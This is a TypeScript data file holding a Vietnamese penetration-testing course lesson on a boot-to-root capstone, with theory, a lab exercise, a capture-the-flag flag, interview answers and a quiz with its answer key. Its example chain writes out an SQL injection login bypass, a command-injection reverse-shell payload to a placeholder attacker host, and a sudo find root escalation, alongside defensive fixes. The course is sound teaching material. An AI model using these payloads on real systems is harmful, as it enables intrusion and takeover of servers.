import { CurriculumLesson } from './types';

export const lesson13: CurriculumLesson = {
  id: 13,
  moduleId: 4,
  moduleName: 'Module 4: Đồ Án Tốt Nghiệp & Dự Tuyển Việc Làm (Capstone)',
  title: 'Bài 13: Đồ Án Tốt Nghiệp Capstone - Chinh phục máy chủ Boot-to-Root toàn diện',
  subtitle: 'Tổng hợp toàn bộ kỹ năng từ Web Recon ➔ Lỗ hổng RCE/SQLi ➔ Leo quyền Root ➔ Báo cáo',
  toolType: 'capstone',
  theory: {
    summary: [
      'Boot-to-Root (B2R) là hình thức sát hạch kỹ năng thực chiến chuẩn mực nhất của các chứng chỉ bảo mật quốc tế (như OSCP, CEH Practical, PNPT).',
      'Thử thách yêu cầu học viên xuất phát từ một địa chỉ IP duy nhất không có thông tin đăng nhập, tiến hành trinh sát quét cổng, tìm ra lỗ hổng web để chiếm shell người dùng thấp (Low Privilege User), sau đó phát hiện điểm yếu leo quyền để chiếm quyền root cao nhất.',
      'Hai mốc cờ chiến thắng: Cờ người dùng (User Flag: user.txt) và Cờ quản trị viên tối cao (Root Flag: root.txt).',
    ],
    plainExplanation:
      'Bài thi này giống như một cuộc thi sát hạch lái xe thực chiến: Bạn không chỉ trả lời câu hỏi lý thuyết trên giấy nữa, mà được giao chìa khóa để tự mình điều khiển xe vượt qua toàn bộ địa hình hiểm trở. Bạn sẽ tự tay trinh sát, khai thác web, leo quyền và cắm lá cờ chiến thắng trên nóc máy chủ mục tiêu.',
    keyTakeaway: 'Hãy luôn ghi chép tỉ mỉ từng bước hành động và giữ thói quen bình tĩnh kiểm tra hệ thống theo phương pháp luận khoa học.',
  },
  example: {
    title: 'Ví dụ: Sơ đồ chuỗi tấn công hoàn chỉnh từ Ngoài Internet vào Lõi Root',
    vulnerableCode: `# 1. Trinh sát cổng mạng:
$ nmap -sV -p 80,22 target.local
# Phát hiện dịch vụ Apache 2.4.41 có trang đăng nhập /admin

# 2. Khai thác Web SQLi Auth Bypass:
# Đăng nhập bằng "admin' OR '1'='1" ➔ Vào trang quản trị

# 3. Khai thác RCE qua tính năng Ping:
# Nhập payload "127.0.0.1 ; bash -i >& /dev/tcp/attacker/4444 0>&1"
# Nhận được reverse shell: www-data@target

# 4. Leo quyền root:
$ sudo -l
# Nhận thấy quyền find NOPASSWD ➔ sudo find . -exec /bin/sh \\;
# whoami ➔ root!`,
    vulnerableExplanation:
      'Toàn bộ chuỗi tấn công liên kết 4 lỗ hổng riêng lẻ thành một con đường thâm nhập xuyên suốt (Attack Chain) để chiếm đoạt hoàn toàn máy chủ.',
    secureCode: `# Mô hình phòng thủ đa tầng (Defense in Depth):
1. Tường lửa đóng cổng quản trị chỉ cho phép truy cập từ VPN nội bộ.
2. Web app sử dụng Prepared Statement ngăn SQLi.
3. Chức năng Ping dùng execFile với mảng tham số cố định và sandboxing.
4. Tài khoản www-data bị thu hồi hoàn toàn đặc quyền sudo.`,
    secureExplanation:
      'Khi một mắt xích bị lỗi, các tầng phòng thủ còn lại vẫn đứng vững để bảo vệ an toàn cho lõi hệ thống.',
  },
  practice: {
    objective: 'Mở Hacker Terminal, hoàn thành toàn bộ chuỗi nhiệm vụ: Gõ "whoami", phát hiện quyền sudo với "sudo -l", leo lên root với "sudo find . -exec /bin/sh \\;" và đọc cờ "cat /root/flag.txt".',
    steps: [
      'Bước 1: Mở Hacker Terminal.',
      'Bước 2: Chạy "sudo -l" để xác nhận quyền NOPASSWD.',
      'Bước 3: Thực thi lệnh leo quyền root "sudo find . -exec /bin/sh \\;".',
      'Bước 4: Đọc cờ tốt nghiệp bằng lệnh "cat /root/flag.txt".',
      'Bước 5: Mở khung chúc mừng tốt nghiệp, điền họ tên để nhận Chứng Chỉ & Hồ Sơ Xin Việc chuẩn.',
    ],
    hint: 'Bạn có thể sử dụng Bash thật trên máy tính cá nhân hoặc Terminal giả lập trong ứng dụng.',
  },
  ctf: {
    scenario: 'Máy chủ thực hành Capstone Boot-to-Root đã sẵn sàng. Hãy hoàn thành việc leo quyền root và trích xuất cờ tốt nghiệp.',
    flag: 'FLAG{cybersecyuta_capstone_certified_master_2026}',
    hint: 'Chạy sudo find . -exec /bin/sh \\; và đọc /root/flag.txt.',
    secretReward: '🎉 XIN CHÚC MỪNG BẠN ĐÃ TỐT NGHIỆP XUẤT SẮC TOÀN BỘ CHƯƠNG TRÌNH ĐÀO TẠO CYBERSECYUTA!',
  },
  interview: {
    question: 'Hãy kể lại một thử thách khai thác Boot-to-Root khó nhất mà bạn từng vượt qua, và phương pháp luận giải quyết vấn đề của bạn là gì?',
    answer:
      'Trong bài Capstone B2R của CyberSecYuta, tôi bắt đầu bằng việc quét thông tin dịch vụ mục tiêu. Sau khi tìm thấy giao diện web có lỗ hổng kiểm soát đầu vào, tôi đã khai thác để lấy reverse shell ban đầu với quyền người dùng thấp www-data. Khi gặp rào cản phân quyền, thay vì thử nghiệm hỗn loạn, tôi kiên trì thực hiện quy trình Enumeration theo chuẩn: kiểm tra quyền sudo bằng "sudo -l", kiểm tra bit SUID và các cronjob ngầm. Nhờ đó, tôi phát hiện tệp thực thi find được cấp NOPASSWD và tận dụng kỹ thuật GTFOBins để leo lên root an toàn. Bài học lớn nhất của tôi là: "Enumeration is key" - 80% thời gian pentest thành công nằm ở khâu thu thập thông tin cẩn trọng.',
    interviewerTip: 'Nhà tuyển dụng muốn nghe về tư duy logic, tính kiên nhẫn và phương pháp luận có hệ thống hơn là việc ghi nhớ payload.',
  },
  exitChallenge: {
    question: 'Thuật ngữ "Boot-to-Root" trong các kỳ thi kiểm thử xâm nhập thực chiến (như OSCP, CTF) có ý nghĩa cốt lõi là gì?',
    options: [
      { id: 'a', text: 'Chỉ cài đặt lại hệ điều hành máy tính từ ổ đĩa trắng' },
      { id: 'b', text: 'Chiếm quyền điều khiển tài khoản quản trị cao nhất (root/SYSTEM) từ một máy chủ không có tài khoản ban đầu' },
      { id: 'c', text: 'Chạy một đoạn script tự động trên GitHub' },
      { id: 'd', text: 'Tạo tài khoản người dùng bình thường trong Linux' },
    ],
    correctOptionId: 'b',
    explanation: 'Boot-to-Root là quá trình xâm nhập hoàn chỉnh từ lúc chưa có quyền truy cập nào cho tới khi giành được đặc quyền tối cao nhất trên máy chủ mục tiêu.',
  },

  // Backward compatibility
  theorySummary: [
    'Boot-to-Root là bài sát hạch kỹ năng thực chiến chuẩn quốc tế.',
    'Yêu cầu hoàn thành chuỗi tấn công từ Web Recon ➔ User Shell ➔ Root PrivEsc.',
    'Hai mốc cờ chiến thắng: User Flag và Root Flag.',
  ],
  taskObjective: 'Hoàn thành toàn bộ chuỗi leo quyền root trong Terminal và mở chứng chỉ tốt nghiệp.',
  interviewQuestion: {
    question: 'Phương pháp luận khi giải máy Boot-to-Root?',
    answer: 'Tuân thủ quy trình Enumeration có hệ thống: Recon ➔ Exploit User Shell ➔ Sudo/SUID PrivEsc ➔ Root. 80% thành công là nhờ Enumeration.',
    interviewerTip: 'Nhấn mạnh tính kiên nhẫn và tư duy phương pháp luận.',
  },
};
